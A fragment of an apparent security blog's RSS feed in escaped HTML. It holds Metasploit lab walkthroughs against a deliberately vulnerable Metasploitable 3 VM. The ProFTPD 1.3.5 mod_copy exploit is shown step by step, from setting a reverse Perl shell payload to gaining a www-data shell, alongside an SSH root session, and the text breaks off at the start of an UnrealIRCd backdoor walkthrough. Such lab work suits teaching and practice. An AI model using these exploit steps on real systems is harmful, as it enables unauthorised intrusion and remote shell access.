+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:1&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; sessions -i
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Active &lt;span class="nv">sessions&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name Type Information Connection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ---- ---- ----------- ----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> shell linux SSH root @ 10.0.2.16:44067 -&amp;gt; 10.0.2.28:22 &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:1&lt;span class="o">)&lt;/span> auxiliary&lt;span class="o">(&lt;/span>scanner/ssh/ssh_login&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Port 21 / ProFTPD 1.3.5</title><link>https://abriljordan.github.io/ajcasinillo/p/port-21-/-proftpd-1.3.5/</link><pubDate>Mon, 18 Sep 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/port-21-/-proftpd-1.3.5/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-proftpd-135-proftpd_modcopy_exec">Vulnerability: ProFTPD 1.3.5 proftpd_modcopy_exec
+&lt;/h2>&lt;p>Port 21 / ProFTPD 1.3.5&lt;/p>
+&lt;p>&lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306" target="_blank" rel="noopener"
+>CVE-2015-3306&lt;/a>: The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.&lt;/p>
+&lt;p>https:// &amp;lt;www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/&amp;gt;&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;span class="lnt">87
+&lt;/span>&lt;span class="lnt">88
+&lt;/span>&lt;span class="lnt">89
+&lt;/span>&lt;span class="lnt">90
+&lt;/span>&lt;span class="lnt">91
+&lt;/span>&lt;span class="lnt">92
+&lt;/span>&lt;span class="lnt">93
+&lt;/span>&lt;span class="lnt">94
+&lt;/span>&lt;span class="lnt">95
+&lt;/span>&lt;span class="lnt">96
+&lt;/span>&lt;span class="lnt">97
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/unix/ftp/proftpd_modcopy_exec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> No payload configured, defaulting to cmd/unix/reverse_netcat
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show targets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit targets:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">0&lt;/span> ProFTPD 1.3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> TARGET &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TARGET&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> basics/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">80&lt;/span> yes HTTP port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT_FTP &lt;span class="m">21&lt;/span> yes FTP port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SITEPATH /var/www yes Absolute writable website path
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SSL &lt;span class="nb">false&lt;/span> no Negotiate SSL/TLS &lt;span class="k">for&lt;/span> outgoing connections
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TARGETURI / yes Base path to the website
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TMPPATH /tmp yes Absolute writable path
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VHOST no HTTP server virtual host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>cmd/unix/reverse_netcat&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST 127.0.0.1 yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> ProFTPD 1.3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOST 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> LHOST 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> SITEPATH /var/www/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SITEPATH&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; /var/www/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show payloads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compatible &lt;span class="nv">Payloads&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> payload/cmd/unix/adduser normal No Add user with useradd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> payload/cmd/unix/bind_awk normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via AWK&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> payload/cmd/unix/bind_netcat normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3&lt;/span> payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5&lt;/span> payload/cmd/unix/generic normal No Unix Command, Generic Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6&lt;/span> payload/cmd/unix/pingback_bind normal No Unix Command Shell, Pingback Bind TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7&lt;/span> payload/cmd/unix/pingback_reverse normal No Unix Command Shell, Pingback Reverse TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8&lt;/span> payload/cmd/unix/reverse_awk normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via AWK&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> payload/cmd/unix/reverse_netcat normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10&lt;/span> payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">11&lt;/span> payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">12&lt;/span> payload/cmd/unix/reverse_python normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Python&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">13&lt;/span> payload/cmd/unix/reverse_python_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via python&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload payload/cmd/unix/reverse_perl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; cmd/unix/reverse_perl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/proftpd_modcopy_exec&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP handler on 10.0.2.16:4444
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:80 - 10.0.2.28:21 - Connected to FTP server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:80 - 10.0.2.28:21 - Sending copy commands to FTP server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:80 - Executing PHP payload /4MUaAhC.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.2.28:80 - Deleted /var/www/html/4MUaAhC.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command shell session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:4444 -&amp;gt; 10.0.2.28:44879&lt;span class="o">)&lt;/span> at 2024-02-20 12:08:32 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable3-ub1404 3.13.0-170-generic &lt;span class="c1">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/var/www/html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>UnrealIRCD 3.2.8.1 Backdoor Command Execution</title><link>https://abriljordan.github.io/ajcasinillo/p/unrealircd-3.2.8.1-backdoor-command-execution/</link><pubDate>Tue, 18 Jul 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/unrealircd-3.2.8.1-backdoor-command-execution/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-unrealircd-3281-backdoor-command-execution">Vulnerability: UnrealIRCD 3.2.8.1 Backdoor Command Execution
+&lt;/h2>&lt;p>UnrealIRCD 3.2.8.1 Backdoor Command Execution&lt;/p>
+&lt;p>&amp;ldquo;This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.&amp;rdquo;&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/" target="_blank" rel="noopener"
+>https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
